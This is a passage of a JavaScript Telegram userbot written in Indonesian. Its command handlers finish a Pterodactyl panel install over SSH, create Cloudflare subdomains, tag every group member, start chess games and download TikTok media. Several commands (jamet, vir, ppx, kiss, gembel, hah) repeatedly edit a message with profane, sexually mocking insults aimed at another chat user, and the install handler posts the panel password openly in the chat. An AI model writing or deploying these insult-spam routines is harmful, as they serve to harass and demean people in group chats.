🔄 <b>sᴛᴇᴘ 5: ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴡɪɴɢs...</b></blockquote>`);
                
                const startWingsCommand = `${wingsTokenCommand} && systemctl restart wings`;
                
                await new Promise((resolve, reject) => {
                    ssh.exec(startWingsCommand, (err, stream) => {
                        if (err) return reject(err);
                        stream.on('close', resolve);
                    });
                });
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                const finalMessage = 
                    `<blockquote>🎉 <b>ɪɴsᴛᴀʟᴀsɪ ᴘᴀɴᴇʟ ʙᴇʀʜᴀsɪʟ!</b>

📋 <b>ɪɴғᴏʀᴍᴀsɪ ʟᴏɢɪɴ:</b>
• URL ᴘᴀɴᴇʟ: https://${domainpanel}
• ᴜsᴇʀɴᴀᴍᴇ: <code>${user}</code>
• ᴘᴀssᴡᴏʀᴅ: <code>${pass}</code>

🌐 <b>ɪɴғᴏʀᴍᴀsɪ ɴᴏᴅᴇ:</b>
• ᴅᴏᴍᴀɪɴ ɴᴏᴅᴇ: ${domainnode}
• RAM ɴᴏᴅᴇ: ${ramserver} MB

🔑 <b>ᴛᴏᴋᴇɴ ᴡɪɴɢs:</b>
<code>${wingsTokenCommand.substring(0, 50)}...</code>
✅ <b>sᴛᴀᴛᴜs:</b> ᴘᴀɴᴇʟ ᴅᴀɴ ᴡɪɴɢs ᴀᴋᴛɪғ!
🎯 <b>ɴᴏᴅᴇ:</b> ʜɪᴊᴀᴜ ᴅᴀɴ sɪᴀᴘ ᴅɪɢᴜɴᴀᴋᴀɴ</blockquote>`;
                
                await client.sendMessage(msg.chatId, {
                    message: finalMessage,
                    parseMode: "html"
                });
                
            } catch (err) {
                console.error("Install panel error:", err);
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {}
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟᴀsɪ ɢᴀɢᴀʟ!</b>

ᴇʀʀᴏʀ: <code>${err.message}</code>

ᴘᴇʀɪᴋsᴀ:
• ᴅᴏᴍᴀɪɴ sᴜᴅᴀʜ ᴅɪᴘᴏɪɴᴛ ᴋᴇ IP VPS
• ᴘᴏʀᴛ 80/443 ᴛᴇʀʙᴜᴋᴀ
• RAM VPS ᴄᴜᴋᴜᴘ (min 1GB)
• ᴋᴏɴᴇᴋsɪ SSH sᴛᴀʙɪʟ</blockquote>`,
                    parseMode: "html"
                });
            } finally {
                ssh.end();
            }
            
        } catch (error) {
            console.error("Install panel handler error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b>\n<code>${error.message}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}subdo`)) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            const text = args.join(' ');
            
            const domainMap = {
    '1': 'naell.my.id',
    '2': 'naell.cloud',
    '3': 'mirayyx.my.id',
    '4': 'xjunzpremium.my.id',
    '5': 'xpublicpanel.biz.id',
    '6': 'ekikjembot.my.id',
    '7': 'xjunzstore.my.id',
    '8': 'infinitycloud.my.id',
    '9': 'pterodactyl-vip.my.id',
    '10': 'vipcloud.biz.id',
    '11': 'xpanelptd.my.id',
    '12': 'privateeserverr.my.id',
    '13': 'publicserverr.my.id',
    '14': 'storedigital.web.id',
    '15': 'mamhost.biz.id',
    '16': 'xyzmam.biz.id',
    '17': 'xyzmamhost.my.id',
    '18': 'storeid.my.id',
    '19': 'panel-freefire.biz.id',
    '20': 'apcb.biz.id',
    '21': 'bokepp.biz.id',
    '22': 'gacorr.biz.id',
    '23': 'cafee.my.id',
    '24': 'vipstoree.my.id',
    '25': 'centzzcloud.my.id',
    '26': 'cupenpendiem.shop',
    '27': 'publicserver.my.id',
    '28': 'hostingers-vvip.my.id',
    '29': 'ekiofficial.web.id',
    '30': 'eki-panelpvrt.my.id',
    '31': 'hostsatoruu.biz.id',
    '32': 'kenz-host.my.id',
    '33': 'panelpro.fun',
    '34': 'pterodactyl-panel.web.id',
    '35': 'store-panell.my.id',
    '36': 'wannhosting.biz.id',
    '37': 'wannhosting.my.id',
    '38': 'xpanelprivate.my.id',
    '39': 'brannmarket.biz.id',
    '40': 'lightsecret.my.id',
    '41': 'lightsecretaja.web.id',
    '42': 'bot-wa-lightsecret.my.id',
    '43': 'syahxkenny.my.id'
};
            
            if (!text) {
            let domainList = "";
            let count = 1;
    
         for (const [id, domain] of Object.entries(domainMap)) {
            domainList += `${id}. ${domain}\n`;
         }
    
    await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ғᴏʀᴍᴀᴛ: <code>${prefix}subdo nama_host,domain_id,ip_vps</code>

ᴄᴏɴᴛᴏʜ: <code>${prefix}subdo myserver,1,123.456.789.0</code>

<b>ᴅᴀғᴛᴀʀ ᴅᴏᴍᴀɪɴ:</b>
${domainList}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
    });
    return;
}
            
            const parts = text.split(',').map(a => a.trim());
            
            if (parts.length !== 3) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ғᴏʀᴍᴀᴛ: <code>${prefix}subdo nama_host,domain_id,ip_vps</code>

ᴄᴏɴᴛᴏʜ: <code>${prefix}subdo myserver,1,123.456.789.0</code>

<b>ᴅᴀғᴛᴀʀ ᴅᴏᴍᴀɪɴ:</b>
${domainList}</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [host, domainId, ip] = parts;
            
            if (!host || !domainId || !ip) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴅᴀᴛᴀ ᴛɪᴅᴀᴋ ʟᴇɴɢᴋᴀᴘ!</b>

ᴘᴀsᴛɪᴋᴀɴ ᴍᴇɴɢɪsɪ:
- ɴᴀᴍᴀ ʜᴏsᴛ
- ɪᴅ ᴅᴏᴍᴀɪɴ (1-2)
- IP VPS</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            if (!global.subdomain || Object.keys(global.subdomain).length === 0) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴋᴏɴғɪɢᴜʀᴀsɪ sᴜʙᴅᴏᴍᴀɪɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</b></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            if (!domainMap[domainId]) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴅᴏᴍᴀɪɴ ɪᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b>

<b>ᴅᴀғᴛᴀʀ ᴅᴏᴍᴀɪɴ ɪᴅ ʏᴀɴɢ ᴠᴀʟɪᴅ:</b>
${domainList}</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const selectedDomain = domainMap[domainId];
            const domainConfig = global.subdomain[selectedDomain];
            
            if (!domainConfig) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴋᴏɴғɪɢᴜʀᴀsɪ ᴜɴᴛᴜᴋ ᴅᴏᴍᴀɪɴ ${selectedDomain} ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</b></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            try {
                await client.deleteMessages(msg.chatId, [msg.id], { revoke: true });
            } catch (e) {
                console.log("Gagal menghapus pesan command:", e.message);
            }
            
            const processingMsg = await client.sendMessage(msg.chatId, {
                message: `<blockquote>🔄 <b>ᴍᴇᴍʙᴜᴀᴛ sᴜʙᴅᴏᴍᴀɪɴ...</b>

ᴅᴏᴍᴀɪɴ: ${selectedDomain}
ʜᴏsᴛɴᴀᴍᴇ: ${host}
IP VPS: ${ip}

<i>ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ...</i></blockquote>`,
                parseMode: "html"
            });
            
            try {
                const subdomain = `${host}.${selectedDomain}`;
                
                const response = await axios.post(
                    `https://api.cloudflare.com/client/v4/zones/${domainConfig.zone}/dns_records`,
                    {
                        type: "A",
                        name: host,
                        content: ip,
                        ttl: 1,
                        proxied: false
                    },
                    {
                        headers: {
                            'Authorization': `Bearer ${domainConfig.apitoken}`,
                            'Content-Type': 'application/json'
                        },
                        timeout: 10000
                    }
                );
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {
                    console.log("Gagal menghapus pesan processing:", e.message);
                }
                
                if (response.data.success) {
                    await client.sendMessage(msg.chatId, {
                        message: `<blockquote>✅ <b>sᴜʙᴅᴏᴍᴀɪɴ ʙᴇʀʜᴀsɪʟ ᴅɪʙᴜᴀᴛ!</b>

🔗 <b>ᴜʀʟ:</b> https://${subdomain}
🌐 <b>ᴅᴏᴍᴀɪɴ:</b> ${selectedDomain}
📡 <b>ɪᴘ:</b> ${ip}
🆔 <b>ɪᴅ:</b> ${response.data.result.id}
⏱️ <b>DNS ᴘʀᴏᴘᴀɢᴀᴛɪᴏɴ:</b> 1-5 minutes

<b>ɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ:</b>
• ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ᴘᴀɴᴇʟ
• ᴡɪɴɢs sᴇʀᴠᴇʀ
• ᴡᴇʙ sᴇʀᴠᴇʀ

<i>sᴜʙᴅᴏᴍᴀɪɴ sɪᴀᴘ ᴅɪɢᴜɴᴀᴋᴀɴ!</i></blockquote>`,
                        parseMode: "html"
                    });
                } else {
                    throw new Error(response.data.errors?.[0]?.message || 'Cloudflare API error');
                }
                
            } catch (apiError) {
                console.error("Cloudflare API error:", apiError.response?.data || apiError.message);
                
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                } catch (e) {
                    console.log("Gagal menghapus pesan processing:", e.message);
                }
                
                let errorMessage = apiError.message;
                if (apiError.response?.data?.errors?.[0]?.message) {
                    errorMessage = apiError.response.data.errors[0].message;
                }
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ sᴜʙᴅᴏᴍᴀɪɴ</b>

Domain: ${selectedDomain}
Hostname: ${host}
IP: ${ip}

<b>ᴇʀʀᴏʀ:</b> ${errorMessage}

<b>sᴏʟᴜsɪ ᴍᴀɴᴜᴀʟ:</b>
1. ʟᴏɢɪɴ ᴋᴇ ᴄʟᴏᴜᴅғʟᴀʀᴇ
2. ᴘɪʟɪʜ ᴢᴏɴᴇ: ${selectedDomain}
3. ᴛᴀᴍʙᴀʜ DNS ʀᴇᴄᴏʀᴅ
4. ᴛʏᴘᴇ: A
5. ɴᴀᴍᴇ: ${host}
6. IPv4: ${ip}
7. TTL: Auto
8. ᴘʀᴏxʏ: ᴅɪsᴀʙʟᴇᴅ

sᴜʙᴅᴏᴍᴀɪɴ: <code>${host}.${selectedDomain}</code></blockquote>`,
                    parseMode: "html"
                });
            }
            
        } catch (error) {
            console.error("Subdo handler error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>Terjadi kesalahan sistem:</b>\n<code>${error.message}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .p
       if (msg.text?.startsWith(`${prefix}l`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "waalaikumsalam"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "waalaikumsalam",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}wl`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "Wa'alaikumsalam Warahmatullahi Wabarakatuh"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "Wa'alaikumsalam Warahmatullahi Wabarakatuh",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}as`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "Salam dulu woy!"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "Salam dulu woy!",
            replyTo: msg.id
        });
    }
    return;
}

       // .jamet
       if (msg.text?.startsWith(`${prefix}jamet`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "WOII.."
        });
        
        const jametTexts = [
            "Lu yang rusuh sanah sinih?",
            "Ni gw bilangin ya",
            "GAUSAH SO ASIK",
            "EMANG LU TERKENAL?",
            "Cuma kacung di real sok mau rusuh",
            "Orang yang kaya lu ni harus gw katain",
            "Jangan sok tinggi di telegram bgstt",
            "BOCAH KAMPUNG",
            "THOLOL KALAU LU MAU RUSUH JANGAN DISINI THOLOL",
            "Mending lu bantu mak lu sono, dari pada ga ada kerjaan"
        ];
        
        for (let i = 0; i < 96; i++) {
            await sleep(200);
            await client.editMessage(msg.chatId, {
                message: msg.id,
                text: jametTexts[i % jametTexts.length]
            });
        }
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "WOII..",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}vir`)) {
    try {
        let msgId = msg.id;
        const texts = [
            "OOOO",
            "INI YANG VIRTUAL",
            "YANG KATANYA SAYANG BANGET",
            "TAPI TETEP AJA DI TINGGAL",
            "NI INGET",
            "TANGANNYA AJA GA BISA DI PEGANG",
            "APALAGI KEMALUAN NYA",
            "BHAHAHAHA",
            "KASIAN BAHAHAHA GBLOK MKN TUH VIRTUAL"
        ];
        
        for (const text of texts) {
            await client.editMessage(msg.chatId, {
                message: msgId,
                text: text
            });
            await sleep(500);
        }
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "VIRTUAL? KASIAN BAHAHAHA GBLOK MKN TUH VIRTUAL",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}ppx`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "`OI PPKK LU KALAU MAU NIMBRUNG, NIMBRUNG AJA GOBLOKKK JGN RUSUHH DISINII THOLOL!!`"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "OI PPKK LU KALAU MAU NIMBRUNG, NIMBRUNG AJA GOBLOKKK JGN RUSUHH DISINII THOLOL!!",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}kiss`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "`CUIHHHH, NIH GW CIUM PALA OTAK KAU, KAU PUNYA OTAK GA GBLKK!!`"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "CUIHHHH, NIH GW CIUM PALA OTAK KAU, KAU PUNYA OTAK GA GBLKK!!",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}pc`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "`Apa kau pantex, mau apa mau pc pc gw anying`"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "Apa kau pantex, mau apa mau pc pc gw anying",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}hah`)) {
    try {
        await client.editMessage(msg.chatId, {
            message: msg.id,
            text: "`EMANG KITA KENAL? KAGA GOBLOK SOKAB BANGET LU GOBLOK!!`"
        });
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "EMANG KITA KENAL? KAGA GOBLOK SOKAB BANGET LU GOBLOK!!",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}gembel`)) {
    try {
        const gembelText = "`MUKA BAPAK LU KEK KELAPA SAWIT ANJING, GA USAH NGATAIN ORANG, MUKA LU AJA KEK GEMBEL TEXAS GOBLOK!!`";
        
        for (let i = 0; i < 11; i++) {
            await client.editMessage(msg.chatId, {
                message: msg.id,
                text: gembelText
            });
            await sleep(2000);
        }
    } catch (e) {
        await client.sendMessage(msg.chatId, {
            message: "MUKA BAPAK LU KEK KELAPA SAWIT ANJING, GA USAH NGATAIN ORANG, MUKA LU AJA KEK GEMBEL TEXAS GOBLOK!!",
            replyTo: msg.id
        });
    }
    return;
}

       // .totag
if (msg.text?.startsWith(`${prefix}totag`)) {
    (async () => {
        try {
            if (msg.isGroup === false) {
                await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Command ini hanya bisa digunakan di dalam group!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }

            let replyMessage;
            try {
                replyMessage = await msg.getReplyMessage();
            } catch (error) {
                console.log("Error getting reply message:", error);
            }

            if (!replyMessage) {
                await client.sendMessage(msg.chatId, {
                    message: "<blockquote>❌ Silakan reply pesan yang ingin ditag!</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }

            const args = msg.text.split(' ').slice(1);
            const additionalText = args.length > 0 ? args.join(' ') : "📢 <b>INFO UNTUK SEMUA!</b>";

            const processingMsg = await client.sendMessage(msg.chatId, {
                message: "<blockquote>⏳ Mengumpulkan data member...</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });

            try {
                let participants = [];
                try {
                    participants = await client.getParticipants(msg.chatId);
                } catch (error) {
                    console.log("getParticipants not available, trying alternative...");
                    
                    try {
                        participants = await client.getChatMembers(msg.chatId);
                    } catch (error2) {
                        console.log("getChatMembers not available...");
                        
                        await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                        
                        const mentionText = `${additionalText}\n\n` +
                                           `@everyone @all\n` +
                                           `📢 <b>SILAKAN PERHATIKAN PESAN DIATAS!</b>\n\n` +
                                           `<i>Reply pesan ini untuk melihat pesan asli</i>`;
                        
                        await client.sendMessage(msg.chatId, {
                            message: `<blockquote>${mentionText}</blockquote>`,
                            parseMode: "html",
                            replyTo: replyMessage.id
                        });
                        
                        await client.sendMessage(msg.chatId, {
                            message: "<blockquote>✅ Tag semua member berhasil dikirim!</blockquote>",
                            parseMode: "html"
                        });
                        return;
                    }
                }

                const selfId = client.user?.id || await client.getMe().then(me => me.id);
                const users = participants.filter(p => {
                    if (!p.id) return false;
                    
                    if (p.id.toString() === selfId?.toString()) return false;
                    
                    if (p.bot === true) return false;
                    
                    return true;
                });

                if (users.length === 0) {
                    await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                    await client.sendMessage(msg.chatId, {
                        message: "<blockquote>❌ Tidak ada member yang dapat ditag!</blockquote>",
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    return;
                }

                await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });

                let mentionsText = `${additionalText}\n\n`;
                let mentionCount = 0;
                const maxMentions = 200;

                for (const user of users) {
                    if (mentionCount >= maxMentions) break;
                    
                    if (user.username) {
                        mentionsText += `@${user.username} `;
                    } else if (user.firstName || user.first_name) {
                        const firstName = user.firstName || user.first_name;
                        const userId = user.id || user.userId;
                        mentionsText += `<a href="tg://user?id=${userId}">${firstName}</a> `;
                    } else if (user.id) {
                        mentionsText += `<a href="tg://user?id=${user.id}">User</a> `;
                    }
                    mentionCount++;
                }

                mentionsText += `\n\n<b>Total: ${users.length} member</b>`;
                if (users.length > maxMentions) {
                    mentionsText += `\n⚠️ <i>Hanya menampilkan ${maxMentions} member pertama</i>`;
                }
                mentionsText += `\n<i>Reply pesan ini untuk melihat pesan asli</i>`;

                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>${mentionsText}</blockquote>`,
                    parseMode: "html",
                    replyTo: replyMessage.id
                });

            } catch (error) {
                console.error("Error processing members:", error);
                await client.deleteMessages(msg.chatId, [processingMsg.id || processingMsg], { revoke: true });
                
                const fallbackText = `${additionalText}\n\n` +
                                    `@everyone @all\n` +
                                    `📢 <b>TAG UNTUK SEMUA MEMBER!</b>\n\n` +
                                    `<i>Reply pesan ini untuk melihat pesan asli</i>`;
                
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>${fallbackText}</blockquote>`,
                    parseMode: "html",
                    replyTo: replyMessage.id
                });
                
                await client.sendMessage(msg.chatId, {
                    message: "<blockquote>✅ Tag berhasil dikirim (menggunakan fallback method)!</blockquote>",
                    parseMode: "html"
                });
            }

        } catch (error) {
            console.error("Totag command error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .catur
       if (msg.text?.startsWith(`${prefix}catur`)) {
    const args = msg.text.split(" ");
    const botUsername = config.botUsername || 'Aksesadd_bot';
    let inlineSuccess = false;

    try {
        try { await client.deleteMessages(msg.chatId, [msg.id], { revoke: true }); } catch (e) { }

        const botEntity = await client.getInputEntity("@" + botUsername);

        let inputPeer;
        try {
            if (msg._inputChat) {
                inputPeer = msg._inputChat;
            } else if (msg.inputChat) {
                inputPeer = msg.inputChat;
            } else if (typeof msg.getInputChat === 'function') {
                inputPeer = await msg.getInputChat();
            } else if (msg.peerId) {
                const peerId = msg.peerId;
                if (peerId.className === 'PeerUser') {
                    const sender = await msg.getSender();
                    if (sender) {
                        inputPeer = new Api.InputPeerUser({
                            userId: sender.id,
                            accessHash: sender.accessHash || BigInt(0)
                        });
                    }
                } else if (peerId.className === 'PeerChat') {
                    inputPeer = new Api.InputPeerChat({
                        chatId: peerId.chatId
                    });
                } else if (peerId.className === 'PeerChannel') {
                    const chat = await msg.getChat();
                    inputPeer = new Api.InputPeerChannel({
                        channelId: peerId.channelId,
                        accessHash: chat?.accessHash || BigInt(0)
                    });
                }
            }
            if (!inputPeer) {
                inputPeer = new Api.InputPeerSelf();
            }
        } catch (peerErr) {
            console.log(`[CATUR] Failed to get inputPeer: ${peerErr.message}`);
            inputPeer = new Api.InputPeerSelf();
        }

        if (args.length < 2) {
            const results = await client.invoke(
                new Api.messages.GetInlineBotResults({
                    bot: botEntity,
                    peer: inputPeer,
                    query: "catur_help",
                    offset: ""
                })
            );

            if (results && results.results && results.results.length > 0) {
                try {
                    await client.invoke(
                        new Api.messages.SendInlineBotResult({
                            peer: inputPeer,
                            queryId: results.queryId,
                            id: results.results[0].id,
                            randomId: BigInt(Math.floor(Math.random() * 1e15))
                        })
                    );
                    inlineSuccess = true;
                    console.log(`[CATUR] Successfully sent help via inline`);
                } catch (sendErr) {
                    console.log(`[CATUR] SendInlineBotResult failed: ${sendErr.message}`);
                }
            }
            
            if (!inlineSuccess) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote><b>🎮 ɢᴀᴍᴇ ᴄᴀᴛᴜʀ</b>

➤ <b>ᴘᴇɴɢɢᴜɴᴀᴀɴ:</b>
<code>${prefix}catur @username</code>

➤ <b>ᴜɴᴛᴜᴋ ʙᴇʀᴍᴀɪɴ:</b>
ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ</blockquote>`,
                    parseMode: "html"
                });
            }
            return;
        }
        
        const opponentUsername = args[1].trim();
        
        if (!opponentUsername.startsWith('@')) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>⚠️ <b>ᴜsᴇʀɴᴀᴍᴇ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ!</b>

ɢᴜɴᴀᴋᴀɴ ᴜsᴇʀɴᴀᴍᴇ ʏᴀɴɢ ʙᴇɴᴀʀ:
<code>${prefix}catur @username</code></blockquote>`,
                parseMode: "html"
            });
            return;
        }
        
        const opponentUsernameClean = opponentUsername.substring(1);
        
        const query = `catur_${opponentUsernameClean}_${Date.now()}`;
        
        console.log(`[CATUR] Query to inline bot: "${query}"`);

        const results = await client.invoke(
            new Api.messages.GetInlineBotResults({
                bot: botEntity,
                peer: inputPeer,
                query: query,
                offset: ""
            })
        );

        if (results && results.results && results.results.length > 0) {
            try {
                await client.invoke(
                    new Api.messages.SendInlineBotResult({
                        peer: inputPeer,
                        queryId: results.queryId,
                        id: results.results[0].id,
                        randomId: BigInt(Math.floor(Math.random() * 1e15))
                    })
                );
                inlineSuccess = true;
                console.log(`[CATUR] Successfully sent inline invitation`);
            } catch (sendErr) {
                console.log(`[CATUR] SendInlineBotResult failed: ${sendErr.message}`);
            }
        } else {
            console.log(`[CATUR] No inline results returned`);
        }
    } catch (e) {
        console.log(`[CATUR] Inline process failed: ${e.message}`);
    }
    return;
}

        // .ttmp4
        if (msg.text?.startsWith(`${prefix}ttmp4`)) {
    try {
        const input = msg.text?.trim().split(/\s+/).slice(1).join(" ") || "";
        const urlMatch = input.match(/https?:\/\/[^\s]+/);

        if (!urlMatch) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ ʏᴀɴɢ ᴠᴀʟɪᴅ!</b>

<b>ᴄᴏɴᴛᴏʜ:</b>
<code>${prefix}tt https://vm.tiktok.com/xxxxx</code>
<code>${prefix}tt https://www.tiktok.com/@user/video/12345</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const tiktokUrl = urlMatch[0];

        const loadingMsg = await client.sendMessage(msg.chatId, {
            message: `<blockquote>⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ...</i></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });

        const res = await fetch("https://www.tikwm.com/api/", {
            method: "POST",
            headers: { 
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: `url=${encodeURIComponent(tiktokUrl)}`
        });

        const data = await res.json().catch(() => ({}));
        
        if (!data || data.code !== 0 || !data.data) {
            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: `<blockquote>❌ <b>ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴀᴛᴀᴜ ʟɪɴᴋ sᴀʟᴀʜ!</b>

<b>ᴘᴀsᴛɪᴋᴀɴ:</b>
1. Link TikTok valid
2. Video tidak di-private
3. Akun tidak di-banned</blockquote>`,
                parseMode: "html"
            });
            return;
        }

        const vid = data.data;
        const videoUrl = vid.play || vid.hdplay || vid.wmplay || vid.play_addr || vid.download;
        
        if (!videoUrl) {
            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: `<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴜᴋᴀɴ URL ᴠɪᴅᴇᴏ!</b></blockquote>`,
                parseMode: "html"
            });
            return;
        }

        try { 
            await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
        } catch (e) {}

        const caption = `<blockquote>🎬 <b>${vid.title || "Video TikTok"}</b>

• <b>ᴘᴇᴍʙᴜᴀᴛ:</b> @${vid.author?.unique_id || "Unknown"}
• <b>ʟɪᴋᴇ:</b> ${vid.digg_count || 0}
• <b>ᴄᴏᴍᴇɴᴛ:</b> ${vid.comment_count || 0}
• <b>ᴅᴜʀᴀsɪ:</b> ${vid.duration || 0} detik

<a href="${tiktokUrl}">🌐 ᴋʟɪᴋ ᴜɴᴛᴜᴋ ʟɪʜᴀᴛ ᴅɪ ᴛɪᴋᴛᴏᴋ</a></blockquote>`;

        try {
            await client.sendFile(msg.chatId, {
                file: videoUrl,
                caption: caption,
                parseMode: "html",
                replyTo: msg.id
            });
        } catch (sendErr) {
            console.error("[TT] Error sending video:", sendErr);
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>🎬 <b>Video TikTok</b>

<b>Link Download:</b> <a href="${videoUrl}">Klik disini</a>

${caption}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }

    } catch (err) {
        console.error("[TT] Error:", err);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ!</b>

<b>Error:</b> ${err.message || "Unknown error"}

<b>ᴘᴇʀɪᴋsᴀ:</b>
1. Koneksi internet
2. Link TikTok valid
3. Coba lagi nanti</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}ttmp3`)) {
    try {
        const input = msg.text?.trim().split(/\s+/).slice(1).join(" ") || "";
        const urlMatch = input.match(/https?:\/\/[^\s]+/);

        if (!urlMatch) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ ʏᴀɴɢ ᴠᴀʟɪᴅ!</b>

<b>ᴄᴏɴᴛᴏʜ:</b>
<code>${prefix}ttmp3 https://vm.tiktok.com/xxxxx</code>
<code>${prefix}ttmp3 https://www.tiktok.com/@user/video/12345</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const tiktokUrl = urlMatch[0];

        const loadingMsg = await client.sendMessage(msg.chatId, {
            message: `<blockquote>⌛️ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ ᴅᴀʀɪ ᴛɪᴋᴛᴏᴋ...</i></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });

        const res = await fetch("https://www.tikwm.com/api/", {
            method: "POST",
            headers: { 
